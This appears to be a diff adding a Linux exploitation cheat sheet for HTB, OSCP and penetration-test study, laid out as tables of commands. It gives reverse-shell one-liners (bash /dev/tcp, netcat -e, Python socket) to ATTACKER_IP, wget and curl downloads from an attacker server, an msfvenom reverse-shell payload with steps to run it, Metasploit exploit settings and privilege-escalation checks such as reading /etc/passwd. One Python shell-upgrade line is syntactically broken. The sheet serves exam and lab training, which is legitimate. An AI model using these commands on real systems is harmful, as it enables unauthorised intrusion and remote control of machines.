@@ -485,3 +485,227 @@ Scan → Identify Linux → Find vulnerable app → Exploit → Upload payload �
 |Check privileges|sudo -l|
 
 ---
+# 🐧 Linux Exploitation Cheat Sheet (Table Mode – HTB / OSCP / Pentest)
+
+---
+
+# 1️⃣ Linux Host Identification
+
+|Method|Command|Purpose|Expected Result|
+|---|---|---|---|
+|Ping TTL|`ping TARGET_IP`|Identify OS|TTL ≈ 64 → Linux|
+|Nmap OS Detection|`nmap -O TARGET_IP`|Detect OS|Linux identified|
+|Full Scan|`nmap -A TARGET_IP`|Identify services|Apache, SSH, MySQL|
+
+---
+
+# 2️⃣ Service Enumeration
+
+|Service|Port|Command|Purpose|
+|---|---|---|---|
+|FTP|21|`nmap -p21 TARGET_IP`|FTP access|
+|SSH|22|`nmap -p22 TARGET_IP`|Remote login|
+|HTTP|80|`nmap -p80 TARGET_IP`|Web server|
+|HTTPS|443|`nmap -p443 TARGET_IP`|Secure web|
+|MySQL|3306|`nmap -p3306 TARGET_IP`|Database|
+
+---
+
+# 3️⃣ Web Enumeration
+
+|Task|Command|Purpose|
+|---|---|---|
+|Open website|`http://TARGET_IP`|Identify web app|
+|Banner grab|`nmap --script banner TARGET_IP`|Service info|
+|Directory brute force|`gobuster dir -u http://TARGET_IP -w wordlist.txt`|Find hidden files|
+
+---
+
+# 4️⃣ Vulnerability Discovery
+
+|Task|Command|Purpose|
+|---|---|---|
+|Search exploit|`searchsploit apache`|Find exploits|
+|Metasploit search|`search rconfig`|Find MSF modules|
+|CVE search|Google app version + exploit|Find vulnerabilities|
+
+---
+
+# 5️⃣ Exploit Execution (Metasploit)
+
+|Step|Command|Purpose|
+|---|---|---|
+|Start MSF|`msfconsole`|Launch Metasploit|
+|Search exploit|`search exploit_name`|Find exploit|
+|Use exploit|`use exploit/module`|Load exploit|
+|Set target|`set RHOSTS TARGET_IP`|Target system|
+|Set attacker|`set LHOST ATTACKER_IP`|Callback IP|
+|Run exploit|`exploit`|Execute exploit|
+
+---
+
+# 6️⃣ Meterpreter Commands
+
+|Command|Purpose|
+|---|---|
+|sysinfo|System info|
+|getuid|Current user|
+|pwd|Current directory|
+|ls|List files|
+|shell|System shell|
+|upload file|Upload file|
+|download file|Download file|
+
+---
+
+# 7️⃣ Basic Linux Commands After Shell
+
+|Command|Purpose|
+|---|---|
+|whoami|Current user|
+|id|User privileges|
+|pwd|Current directory|
+|ls|List files|
+|uname -a|System info|
+|hostname|System name|
+
+---
+
+# 8️⃣ Upgrade Non-TTY Shell
+
+|Task|Command|Purpose|
+|---|---|---|
+|Check python|`which python`|Check availability|
+|Spawn TTY|`python -c 'import pty; pty.spawn("/bin/sh")'`|Upgrade shell|
+|Alternative|`python3 -c 'import pty; pty.spawn("/bin/bash")'`|Better shell|
+
+---
+
+# 9️⃣ Privilege Escalation Enumeration
+
+|Task|Command|Purpose|
+|---|---|---|
+|Check sudo|`sudo -l`|Check sudo rights|
+|Find SUID files|`find / -perm -4000 2>/dev/null`|Priv esc|
+|Check cron jobs|`crontab -l`|Scheduled tasks|
+|Check passwd|`cat /etc/passwd`|User accounts|
+|Check kernel|`uname -r`|Kernel exploits|
+
+---
+
+# 🔟 Network Enumeration
+
+|Command|Purpose|
+|---|---|
+|ip a|IP address|
+|ifconfig|Network info|
+|netstat -antp|Open ports|
+|ss -tulpn|Listening services|
+
+---
+
+# 1️⃣1️⃣ File Transfer (Attacker → Target)
+
+|Method|Command|
+|---|---|
+|Python server|`python3 -m http.server 8000`|
+|Download file|`wget http://ATTACKER_IP:8000/file`|
+|Curl download|`curl http://ATTACKER_IP/file -o file`|
+
+---
+
+# 1️⃣2️⃣ Reverse Shell Commands
+
+|Shell|Command|
+|---|---|
+|Bash|`bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1`|
+|Netcat|`nc ATTACKER_IP 4444 -e /bin/bash`|
+|Python|`python -c 'import socket,os,pty;s=socket.socket();s.connect(("ATTACKER_IP",4444));pty.spawn("/bin/bash")'`|
+
+---
+
+# 1️⃣3️⃣ Payload Creation (MSFvenom)
+
+|Task|Command|
+|---|---|
+|Create payload|`msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f elf > shell.elf`|
+|Execute payload|`chmod +x shell.elf && ./shell.elf`|
+
+---
+
+# 1️⃣4️⃣ Privilege Escalation Checks
+
+|Task|Command|
+|---|---|
+|SUID binaries|`find / -perm -4000`|
+|Writable files|`find / -writable 2>/dev/null`|
+|Cron jobs|`ls -la /etc/cron*`|
+|Running processes|`ps aux`|
+
+---
+
+# 1️⃣5️⃣ Identify Shell Type
+
+|Prompt|Shell|
+|---|---|
+|$|User shell|
+|#|Root shell|
+|meterpreter >|Meterpreter|
+|sh-4.2$|TTY shell|
+
+---
+
+# 1️⃣6️⃣ Important Linux Directories
+
+|Directory|Purpose|
+|---|---|
+|/etc|Config files|
+|/home|User directories|
+|/var/www|Web root|
+|/tmp|Temporary files|
+|/root|Root directory|
+
+---
+
+# 1️⃣7️⃣ Exploitation Workflow (Exam Ready)
+
+|Step|Command|
+|---|---|
+|Scan|`nmap -sC -sV TARGET_IP`|
+|Identify services|Analyze output|
+|Find exploit|`searchsploit service`|
+|Run exploit|Metasploit exploit|
+|Get shell|`shell`|
+|Upgrade shell|Python pty.spawn|
+|Priv esc|sudo -l|
+
+---
+
+# 1️⃣8️⃣ Most Important Commands (Quick Use)
+
+|Task|Command|
+|---|---|
+|Scan target|nmap -sC -sV TARGET_IP|
+|Get shell|exploit|
+|Upgrade shell|python -c 'import pty.spawn("/bin/sh")'|
+|Check user|whoami|
+|Check sudo|sudo -l|
+|Check kernel|uname -a|
+
+---
+
+# 1️⃣9️⃣ Full Linux Attack Chain
+
+|Step|Action|
+|---|---|
+|1|Scan target|
+|2|Identify Linux|
+|3|Enumerate services|
+|4|Find vulnerability|
+|5|Run exploit|
+|6|Get shell|
+|7|Upgrade shell|
+|8|Privilege escalation|
+
+---
+
